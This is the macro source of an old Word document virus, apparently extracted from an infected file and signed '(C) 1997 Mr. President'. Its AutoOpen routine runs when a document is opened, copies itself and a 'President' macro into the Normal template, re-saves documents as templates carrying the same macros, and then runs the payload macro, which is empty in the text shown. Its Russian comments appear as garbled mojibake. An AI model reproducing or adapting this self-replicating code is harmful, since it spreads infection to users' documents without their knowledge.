   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "President"

   Public Sub MAIN()
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim NJ$
   Dim NameF$
   Dim i
   Dim inst
   Dim NameF2$
   Dim inst2
   Dim Copyright$

   'Èíñòàëëÿöèÿ
       NJ$ = "President"
       NameF$ = WordBasic.[FileName$]()
       For i = 1 To WordBasic.CountMacros(0, 0)
           If WordBasic.[MacroName$](i, 0, 0) = NJ$ Then
                   inst = 1
           End If
       Next i
       If inst = 0 Then
           WordBasic.MacroCopy NameF$ + ":AutoOpen", "AutoOpen"
           WordBasic.MacroCopy NameF$ + ":" + NJ$, NJ$
       End If

   'Ðàçìíîæåíèå
       NameF2$ = WordBasic.[FileName$]()
       For i = 1 To WordBasic.CountMacros(1, 0)
           If WordBasic.[MacroName$](i, 1, 0) = NJ$ Then
                   inst2 = 1
           End If
       Next i
       If inst2 = 0 Then
           WordBasic.FileSaveAs Name:=NameF2$, Format:=1
           WordBasic.MacroCopy "Normal:AutoOpen", NameF2$ + ":AutoOpen"
           WordBasic.MacroCopy "Normal:" + NJ$, NameF2$ + ":" + NJ$
           WordBasic.FileSave
       End If

   'Âåñåëûå äåéñòâèÿ
       WordBasic.ToolsMacro Name:=NJ$, Run:=1
       Copyright$ = "(C) 1997 Mr. President"

   End Sub
